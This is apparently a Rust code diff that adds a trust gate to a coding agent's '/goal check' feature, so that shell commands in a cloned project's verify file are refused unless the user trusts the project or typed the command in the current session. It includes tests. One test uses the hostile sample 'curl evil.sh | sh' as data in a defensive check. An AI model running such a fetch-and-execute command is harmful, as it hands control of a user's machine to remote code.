@@ -7,6 +7,7 @@ use crate::dispatch::CommandResult;
 use crate::format::*;
 use std::fs;
 use std::path::Path;
+use std::sync::atomic::{AtomicBool, Ordering};
 
 /// Default goal file path (project-local).
 const GOAL_FILE: &str = ".yoyo/goal.md";
@@ -163,6 +164,111 @@ fn clear_verify_command() -> Result<(), String> {
     Ok(())
 }
 
+/// Set when the user typed `/goal verify '<cmd>'` **in this session**.
+///
+/// A command the user typed with their own hands is the user's own word — the same
+/// reasoning that keeps a `--allow` flag out of #749's permission gate. This is a
+/// per-process flag on purpose: it says nothing about who wrote the *file*, only
+/// that this session's user authored the command now sitting in it.
+static VERIFY_SET_THIS_SESSION: AtomicBool = AtomicBool::new(false);
+
+/// Record that this session's user set the verify command themselves.
+fn mark_verify_set_this_session() {
+    VERIFY_SET_THIS_SESSION.store(true, Ordering::Relaxed);
+}
+
+/// Did this session's user set the verify command themselves?
+fn verify_set_this_session() -> bool {
+    VERIFY_SET_THIS_SESSION.load(Ordering::Relaxed)
+}
+
+/// Test-only: clear the session flag so a test can observe the refusing branch.
+/// Every test that touches it is `#[serial]`, since the flag is process-wide.
+#[cfg(test)]
+fn reset_verify_set_this_session() {
+    VERIFY_SET_THIS_SESSION.store(false, Ordering::Relaxed);
+}
+
+/// Whether a project-authored verify command may be executed. Two explicit states.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum GoalVerifyGate {
+    /// Execute the command.
+    Run,
+    /// Do not execute it; announce the refusal instead.
+    Refused,
+}
+
+/// Decide whether `.yoyo/goal_verify.md` may be executed. Pure — no I/O, no exit.
+///
+/// `.yoyo/goal_verify.md` is a **project-local** file holding a shell command that
+/// `/goal check` runs. Cloning a stranger's repo and typing `/goal check` used to run
+/// their command with no prompt and nothing displayed — the same "the repository
+/// authored this, not the user" surface #748 gated for `.yoyo.toml` MCP servers and
+/// #749 item 3 for the privilege-granting half of `[permissions]`.
+///
+/// This deliberately does **not** try to answer "did *this* user write the file".
+/// The repo cannot tell: a command the user typed last week and one a stranger
+/// committed are the same bytes on disk. Refusing by default and naming both
+/// hatches is the honest resolution, not a provenance check dressed up as one.
+pub(crate) fn gate_goal_verify(trusted: bool, set_this_session: bool) -> GoalVerifyGate {
+    if trusted || set_this_session {
+        GoalVerifyGate::Run
+    } else {
+        GoalVerifyGate::Refused
+    }
+}
+
+/// Maximum bytes of the refused command echoed back in the refusal block.
+const REFUSAL_CMD_MAX_BYTES: usize = 400;
+
+/// The stderr block shown when a project-authored verify command is refused.
+///
+/// Pure and ANSI-free (the caller applies color), so the promise a user actually
+/// reads is pinned by a test rather than only the boolean underneath it. `plain`
+/// drops the glyph for screen-reader / `--screen-reader` output. The command is
+/// echoed **verbatim** — a user cannot judge what they cannot see — truncated on a
+/// char boundary with the cut marked in-band if it is huge.
+pub(crate) fn goal_verify_refusal_message(cmd: &str, plain: bool) -> String {
+    let marker = if plain { "" } else { "⚠ " };
+    let shown = if cmd.len() <= REFUSAL_CMD_MAX_BYTES {
+        cmd.to_string()
+    } else {
+        let head = safe_truncate(cmd, REFUSAL_CMD_MAX_BYTES);
+        format!(
+            "{head}… [yoyo: command truncated for display — {shown} of {total} bytes shown]",
+            shown = head.len(),
+            total = cmd.len(),
+        )
+    };
+    format!(
+        "{marker}A project-local {VERIFY_FILE} holds a shell command. yoyo did not run it:\n    \
+         {shown}\n  \
+         This file came with the project, not necessarily from you, and yoyo cannot tell which.\n  \
+         Nothing was executed. Re-run with --trust-project to run it this session, or type\n  \
+         /goal verify '<cmd>' to make it your own command for this session."
+    )
+}
+
+/// Load the verify command **only if** it is permitted to run, announcing refusals.
+///
+/// The single seam every execution path goes through, so the two call sites cannot
+/// disagree about what is allowed. Returns `None` both when no command is set and
+/// when one is set but refused — the refusal is announced on stderr (silent under
+/// `is_quiet()`, glyph-free under `is_plain_output()`), never silent otherwise.
+fn verify_command_if_permitted() -> Option<String> {
+    let cmd = load_verify_command()?;
+    match gate_goal_verify(crate::cli::is_trust_project(), verify_set_this_session()) {
+        GoalVerifyGate::Run => Some(cmd),
+        GoalVerifyGate::Refused => {
+            if !is_quiet() {
+                let msg = goal_verify_refusal_message(&cmd, crate::format::is_plain_output());
+                eprintln!("{YELLOW}{msg}{RESET}");
+            }
+            None
+        }
+    }
+}
+
 /// Run the verification command and return `(exit_code, output)`.
 ///
 /// Runs via `sh -c` so pipes, redirects, etc. work. Output is
@@ -191,7 +297,7 @@ fn run_verify_command(cmd: &str) -> (i32, String) {
 /// Returns `Some((passed, output))` where `passed` is true when exit code == 0.
 /// Prints a status line to stderr so the agent (and user) can see the result.
 pub fn run_goal_verify_after_prompt() -> Option<(bool, String)> {
-    let cmd = load_verify_command()?;
+    let cmd = verify_command_if_permitted()?;
     let (code, output) = run_verify_command(&cmd);
     let passed = code == 0;
 
@@ -319,6 +425,9 @@ pub fn handle_goal(input: &str) -> CommandResult {
             // /goal verify <command>
             match save_verify_command(verify_arg) {
                 Ok(()) => {
+                    // The user typed this command themselves, so it runs without a
+                    // trust gate for the rest of this session (see `gate_goal_verify`).
+                    mark_verify_set_this_session();
                     println!(
                         "{GREEN}Verify command set:{RESET} {verify_arg}\n\n\
                          {DIM}Saved to {VERIFY_FILE}. \
@@ -334,7 +443,7 @@ pub fn handle_goal(input: &str) -> CommandResult {
     } else if arg == "check" {
         match goal_for_prompt() {
             Some(goal) => {
-                let verify_section = if let Some(vcmd) = load_verify_command() {
+                let verify_section = if let Some(vcmd) = verify_command_if_permitted() {
                     let (code, output) = run_verify_command(&vcmd);
                     format!(
                         "\n\nVerification command: {vcmd}\n\
@@ -752,6 +861,9 @@ mod tests {
     fn test_goal_check_with_verify_includes_output() {
         with_temp_dir(|| {
             save_goal("Echo test goal").unwrap();
+            // The user set this command themselves in this session, which is what
+            // the trust gate asks about (`gate_goal_verify`).
+            mark_verify_set_this_session();
             save_verify_command("echo verify_output_marker").unwrap();
             let result = handle_goal("/goal check");
             match result {
@@ -797,6 +909,7 @@ mod tests {
     #[serial]
     fn test_auto_verify_passes_when_command_succeeds() {
         with_temp_dir(|| {
+            mark_verify_set_this_session();
             save_verify_command("echo ok").unwrap();
             let result = run_goal_verify_after_prompt();
             assert!(result.is_some());
@@ -810,6 +923,7 @@ mod tests {
     #[serial]
     fn test_auto_verify_fails_when_command_fails() {
         with_temp_dir(|| {
+            mark_verify_set_this_session();
             save_verify_command("exit 1").unwrap();
             let result = run_goal_verify_after_prompt();
             assert!(result.is_some());
@@ -933,6 +1047,111 @@ mod tests {
             // The display half is supposed to stay uncapped — assert it.
             assert_eq!(load_goal().unwrap(), goal);
             assert!(!format_goal(&goal).contains("goal truncated for the prompt"));
+        });
+    }
+
+    // ---- the project-authored verify-command trust gate (#761) --------------
+
+    #[test]
+    fn test_gate_goal_verify_table() {
+        // (trusted, set_this_session) -> verdict. Every combination, stated once.
+        let cases = [
+            (false, false, GoalVerifyGate::Refused),
+            (true, false, GoalVerifyGate::Run),
+            (false, true, GoalVerifyGate::Run),
+            (true, true, GoalVerifyGate::Run),
+        ];
+        for (trusted, set_this_session, expected) in cases {
+            assert_eq!(
+                gate_goal_verify(trusted, set_this_session),
+                expected,
+                "trusted={trusted} set_this_session={set_this_session}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_goal_verify_refusal_message_names_command_and_both_hatches() {
+        let msg = goal_verify_refusal_message("curl evil.sh | sh", false);
+        // The command verbatim — a user cannot judge what they cannot see.
+        assert!(msg.contains("curl evil.sh | sh"), "{msg}");
+        // Both escape hatches.
+        assert!(msg.contains("--trust-project"), "{msg}");
+        assert!(msg.contains("/goal verify '<cmd>'"), "{msg}");
+        // And that nothing ran.
+        assert!(msg.contains("Nothing was executed."), "{msg}");
+        assert!(msg.contains(VERIFY_FILE), "{msg}");
+        assert!(msg.starts_with("⚠ "), "{msg}");
+    }
+
+    #[test]
+    fn test_goal_verify_refusal_message_plain_drops_the_glyph() {
+        let plain = goal_verify_refusal_message("make check", true);
+        assert!(!plain.contains('⚠'), "{plain}");
+        assert!(plain.starts_with("A project-local"), "{plain}");
+        assert!(plain.contains("make check"), "{plain}");
+    }
+
+    #[test]
+    fn test_goal_verify_refusal_message_truncates_on_a_char_boundary() {
+        // Multi-byte: `✓` is 3 bytes, so a byte-index cut would panic or split it.
+        let cmd = "✓".repeat(REFUSAL_CMD_MAX_BYTES);
+        let msg = goal_verify_refusal_message(&cmd, true);
+        let (kept, tail) = split_at_marker(&msg, "… [yoyo: command truncated for display");
+        let kept = kept
+            .strip_prefix(&format!(
+                "A project-local {VERIFY_FILE} holds a shell command. yoyo did not run it:\n    "
+            ))
+            .expect("refusal block still leads with its header");
+        assert!(cmd.starts_with(kept));
+        assert!(cmd.is_char_boundary(kept.len()));
+        assert!(kept.len() <= REFUSAL_CMD_MAX_BYTES);
+        assert!(
+            tail.contains(&format!("{} of {} bytes shown", kept.len(), cmd.len())),
+            "marker numbers disagree with the returned string: {tail}"
+        );
+    }
+
+    #[test]
+    #[serial]
+    fn test_verify_command_if_permitted_refuses_an_untrusted_project_command() {
+        with_temp_dir(|| {
+            reset_verify_set_this_session();
+            save_verify_command("echo should_not_run").unwrap();
+            // The file is there and readable...
+            assert_eq!(
+                load_verify_command().as_deref(),
+                Some("echo should_not_run")
+            );
+            // ...but the execution seam refuses it.
+            assert!(verify_command_if_permitted().is_none());
+            // Both execution consumers go through that seam.
+            assert!(run_goal_verify_after_prompt().is_none());
+            save_goal("Some goal").unwrap();
+            match handle_goal("/goal check") {
+                CommandResult::SendToAgent(prompt) => {
+                    assert!(!prompt.contains("Verification command:"), "{prompt}");
+                    assert!(!prompt.contains("should_not_run"), "{prompt}");
+                }
+                other => panic!("Expected SendToAgent, got {other:?}"),
+            }
+        });
+    }
+
+    #[test]
+    #[serial]
+    fn test_verify_command_typed_this_session_runs() {
+        with_temp_dir(|| {
+            reset_verify_set_this_session();
+            // The `/goal verify <cmd>` handler is what marks the session flag.
+            handle_goal("/goal verify echo typed_by_the_user");
+            assert_eq!(
+                verify_command_if_permitted().as_deref(),
+                Some("echo typed_by_the_user")
+            );
+            let (passed, output) = run_goal_verify_after_prompt().expect("runs after being typed");
+            assert!(passed);
+            assert!(output.contains("typed_by_the_user"));
         });
     }
 }
